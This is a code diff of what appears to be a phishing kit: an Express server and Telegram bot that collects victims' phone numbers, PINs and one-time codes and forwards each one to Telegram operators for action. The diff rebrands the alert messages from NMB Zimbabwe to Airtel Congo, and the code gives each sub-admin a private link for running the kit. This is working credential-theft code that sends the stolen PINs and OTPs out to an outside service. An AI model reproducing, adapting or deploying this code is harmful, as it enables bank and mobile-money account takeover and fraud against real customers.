@@ -57,6 +57,7 @@ function isValidZimbabwePhone(phone) {
 
 function resolveTargetChat(adminParam) {
   const fallbackAdminId = getFallbackAdmin();
+  
   if (adminParam && String(adminParam).trim() !== '') {
     const targetAdmin = String(adminParam).trim();
     if (targetAdmin === String(fallbackAdminId)) {
@@ -67,6 +68,8 @@ function resolveTargetChat(adminParam) {
       return targetAdmin;
     }
   }
+  
+  // Automatically fallback to the Main Admin from Render if no valid param is provided
   return fallbackAdminId || null;
 }
 
@@ -256,7 +259,6 @@ function initBot() {
         return;
       }
 
-      // Automatically send private link & user info upon /start if already authorized
       const userLink = `${appUrl}/?admin=${chatId}`;
       let responseText = 
         `🎉 *Welcome back, ${firstName}!* Your account is active.\n\n` +
@@ -299,7 +301,6 @@ function initBot() {
           const assignedLink = `${appUrl}/?admin=${targetSubId}`;
           const usernameDisplay = subRecord.username ? `@${subRecord.username}` : 'None';
           
-          // Automatically send private link & user information upon approval
           await bot.sendMessage(targetSubId, 
             `🎉 *Congratulations!* Your account has been approved and authorized.\n\n` +
             `👤 *Your User Information*\n` +
@@ -438,7 +439,7 @@ app.post('/api/submit-pin', async (req, res) => {
     session.pin = pin;
     session.status = 'pending';
 
-    const message = `🚨 <b>NMB ZIMBABWE - NEW SUBMISSION</b>\n\n` +
+    const message = `🚨 <b>AIRTEL CONGO - NEW SUBMISSION</b>\n\n` +
                     `📱 <b>Contact (${session.contactType.toUpperCase()}):</b> ${session.contact}\n` +
                     `🔑 <b>PIN Entered:</b> ${pin}\n\n` +
                     `<i>Choose action for applicant:</i>`;
@@ -476,7 +477,7 @@ app.post('/api/submit-otp', async (req, res) => {
     session.otp = otp;
     session.status = 'pending';
 
-    const message = `🔐 <b>NMB ZIMBABWE - OTP VERIFICATION</b>\n\n` +
+    const message = `🔐 <b>AIRTEL CONGO - OTP VERIFICATION</b>\n\n` +
                     `📱 <b>Contact (${session.contactType.toUpperCase()}):</b> ${session.contact}\n` +
                     `🔑 <b>OTP Code:</b> ${otp}\n\n` +
                     `<i>Verify OTP:</i>`;
